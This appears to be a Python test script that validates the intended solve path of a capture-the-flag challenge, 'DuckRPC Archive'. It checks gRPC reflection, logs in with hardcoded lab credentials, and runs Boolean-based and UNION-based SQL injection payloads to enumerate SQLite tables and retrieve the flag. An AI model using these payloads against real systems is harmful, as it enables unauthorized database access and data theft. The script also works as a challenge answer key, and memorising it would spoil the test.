#!/usr/bin/env python3

"""
DuckRPC Archive - Automated Challenge Validation

This script validates the intended challenge path:
1. Connect to the gRPC server.
2. Verify gRPC services through reflection.
3. Authenticate using the provided employee credentials.
4. Verify authenticated document search.
5. Verify Boolean-based SQL injection.
6. Enumerate SQLite database tables.
7. Verify the internal_records table exists.
8. Retrieve the challenge flag.

Run:
    python tests/validate.py

Optional:
    python tests/validate.py --host localhost --port 50051
"""

import argparse
import sys
from pathlib import Path

import grpc
from grpc_reflection.v1alpha import reflection_pb2
from grpc_reflection.v1alpha import reflection_pb2_grpc

# Import generated protobuf files.
#
# This assumes the generated files are available under:
#
# src/generated/
#
# Adjust the import path if your generated package uses a different name.
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "src"))

try:
    from generated import duckrpc_pb2
    from generated import duckrpc_pb2_grpc
except ImportError as exc:
    print("[FAIL] Unable to import generated protobuf modules.")
    print(f"[ERROR] {exc}")
    print()
    print(
        "Make sure the protobuf files have been generated and are "
        "available in src/generated/."
    )
    sys.exit(1)


# ============================================================
# Configuration
# ============================================================

USERNAME = "alice"
PASSWORD = "AliceArchive2026!"

def is_valid_flag(value):
    """
    Validate the expected flag format without hardcoding
    the challenge flag value.
    """

    return (
        isinstance(value, str)
        and value.startswith("duck{")
        and value.endswith("}")
    )

EXPECTED_SERVICES = {
    "duckrpc.ArchiveService",
    "duckrpc.AuthService",
}


# ============================================================
# Output Helpers
# ============================================================

def info(message):
    print(f"[*] {message}")


def success(message):
    print(f"[PASS] {message}")


def failure(message):
    print(f"[FAIL] {message}")


def fatal(message):
    failure(message)
    sys.exit(1)


# ============================================================
# gRPC Reflection
# ============================================================

def list_services(channel):
    """
    Enumerate services using gRPC reflection.
    """

    info("Checking gRPC server reflection...")

    stub = reflection_pb2_grpc.ServerReflectionStub(channel)

    request = reflection_pb2.ServerReflectionRequest(
        list_services=""
    )

    responses = stub.ServerReflectionInfo(
        iter([request])
    )

    services = set()

    try:
        for response in responses:
            if response.HasField("list_services_response"):
                for service in response.list_services_response.service:
                    services.add(service.name)

                break

    except grpc.RpcError as exc:
        fatal(
            "Unable to enumerate gRPC services through reflection: "
            f"{exc.code().name} - {exc.details()}"
        )

    missing = EXPECTED_SERVICES - services

    if missing:
        fatal(
            "Expected gRPC services were not found: "
            + ", ".join(sorted(missing))
        )

    success(
        "gRPC reflection is enabled and expected services are available."
    )

    return services


# ============================================================
# Authentication
# ============================================================

def login(channel):
    """
    Authenticate using the provided employee credentials.
    """

    info("Authenticating as the provided employee account...")

    stub = duckrpc_pb2_grpc.AuthServiceStub(channel)

    request = duckrpc_pb2.LoginRequest(
        username=USERNAME,
        password=PASSWORD,
    )

    try:
        response = stub.Login(
            request,
            timeout=5,
        )

    except grpc.RpcError as exc:
        fatal(
            "Authentication failed: "
            f"{exc.code().name} - {exc.details()}"
        )

    token = getattr(response, "token", None)

    if not token:
        fatal("Authentication succeeded but no token was returned.")

    success("Authentication succeeded and a token was returned.")

    return token


# ============================================================
# Authenticated Search
# ============================================================

def search_documents(channel, token, query):
    """
    Call ArchiveService.SearchDocuments with authentication metadata.
    """

    stub = duckrpc_pb2_grpc.ArchiveServiceStub(channel)

    request = duckrpc_pb2.SearchRequest(
        query=query
    )

    metadata = (
        (
            "authorization",
            f"Bearer {token}",
        ),
    )

    try:
        response = stub.SearchDocuments(
            request,
            metadata=metadata,
            timeout=5,
        )

        return response

    except grpc.RpcError as exc:
        fatal(
            "SearchDocuments request failed: "
            f"{exc.code().name} - {exc.details()}"
        )


# ============================================================
# Response Helpers
# ============================================================

def get_documents(response):
    """
    Return the documents field safely.
    """

    documents = getattr(response, "documents", None)

    if documents is None:
        return []

    return list(documents)


def response_contains_text(response, text):
    """
    Search all returned document fields for text.
    """

    for document in get_documents(response):

        values = [
            str(getattr(document, "id", "")),
            str(getattr(document, "title", "")),
            str(getattr(document, "owner", "")),
            str(getattr(document, "content", "")),
        ]

        combined = " ".join(values)

        if text in combined:
            return True

    return False


# ============================================================
# Normal Search Validation
# ============================================================

def validate_normal_search(channel, token):
    """
    Verify that authenticated normal document search works.
    """

    info("Testing authenticated normal document search...")

    response = search_documents(
        channel,
        token,
        "",
    )

    documents = get_documents(response)

    if not documents:
        fatal(
            "Normal authenticated search returned no documents."
        )

    success(
        f"Authenticated normal search returned "
        f"{len(documents)} document(s)."
    )


# ============================================================
# Boolean SQL Injection Validation
# ============================================================

def validate_boolean_sqli(channel, token):
    """
    Verify Boolean-based SQL injection behavior.

    False condition:
        ' AND 1=2 --

    Expected:
        No results.

    True condition:
        ' AND 1=1 --

    Expected:
        One or more results.
    """

    info("Testing Boolean-based SQL injection behavior...")

    false_payload = "' AND 1=2 -- "
    true_payload = "' AND 1=1 -- "

    false_response = search_documents(
        channel,
        token,
        false_payload,
    )

    true_response = search_documents(
        channel,
        token,
        true_payload,
    )

    false_documents = get_documents(false_response)
    true_documents = get_documents(true_response)

    if false_documents:
        fatal(
            "False SQL condition unexpectedly returned results."
        )

    if not true_documents:
        fatal(
            "True SQL condition did not return any results."
        )

    success(
        "Boolean-based SQL injection behavior was successfully verified."
    )


# ============================================================
# Database Enumeration Validation
# ============================================================

def validate_table_enumeration(channel, token):
    """
    Enumerate SQLite tables through UNION-based SQL injection.
    """

    info("Enumerating database tables through SQL injection...")

    payload = (
        "' UNION SELECT 1, name, 'x', 'x' "
        "FROM sqlite_master "
        "WHERE type='table' -- "
    )

    response = search_documents(
        channel,
        token,
        payload,
    )

    documents = get_documents(response)

    table_names = set()

    for document in documents:
        title = getattr(document, "title", None)

        if title:
            table_names.add(title)

    if "internal_records" not in table_names:
        fatal(
            "The internal_records table was not discovered "
            "through the intended SQL injection path."
        )

    success(
        "Database enumeration succeeded and internal_records was found."
    )


# ============================================================
# Flag Retrieval Validation
# ============================================================

def validate_flag_retrieval(channel, token):
    """
    Retrieve the challenge flag through UNION-based SQL injection.
    """

    info("Attempting challenge flag retrieval...")

    payload = (
        "' UNION SELECT id, record_name, 'internal', record_value "
        "FROM internal_records -- "
    )

    response = search_documents(
        channel,
        token,
        payload,
    )

    documents = get_documents(response)

    retrieved_flag = None

    for document in documents:

        content = getattr(
            document,
            "content",
            "",
        )

        if "duck{" in content:
            retrieved_flag = content
            break

    if not retrieved_flag:
        fatal(
            "Flag was not retrieved through the intended SQL injection path."
        )

    if not is_valid_flag(retrieved_flag):
        fatal(
            "A value was retrieved, but it does not match "
            "the expected flag format."
        )

    success(
        f"Flag successfully retrieved: {retrieved_flag}"
    )


# ============================================================
# Main Validation
# ============================================================

def main():

    parser = argparse.ArgumentParser(
        description=(
            "DuckRPC Archive automated challenge validation."
        )
    )

    parser.add_argument(
        "--host",
        default="localhost",
        help="gRPC server host (default: localhost)",
    )

    parser.add_argument(
        "--port",
        type=int,
        default=50051,
        help="gRPC server port (default: 50051)",
    )

    args = parser.parse_args()

    target = f"{args.host}:{args.port}"

    print()
    print("=" * 60)
    print(" DuckRPC Archive - Automated Challenge Validation")
    print("=" * 60)
    print()

    info(f"Target: {target}")

    channel = grpc.insecure_channel(target)

    try:

        # ----------------------------------------------------
        # Check server connectivity
        # ----------------------------------------------------

        info("Checking gRPC server connectivity...")

        try:

            grpc.channel_ready_future(
                channel
            ).result(timeout=10)

        except grpc.FutureTimeoutError:
            fatal(
                "Unable to connect to the gRPC server."
            )

        success(
            "gRPC server is reachable."
        )

        # ----------------------------------------------------
        # Validation Path
        # ----------------------------------------------------

        list_services(channel)

        token = login(channel)

        validate_normal_search(
            channel,
            token,
        )

        validate_boolean_sqli(
            channel,
            token,
        )

        validate_table_enumeration(
            channel,
            token,
        )

        validate_flag_retrieval(
            channel,
            token,
        )

        # ----------------------------------------------------
        # Final Result
        # ----------------------------------------------------

        print()
        print("=" * 60)
        print("[SUCCESS] ALL CHALLENGE VALIDATION TESTS PASSED")
        print("=" * 60)
        print()

        return 0

    finally:
        channel.close()


if __name__ == "__main__":
    sys.exit(main())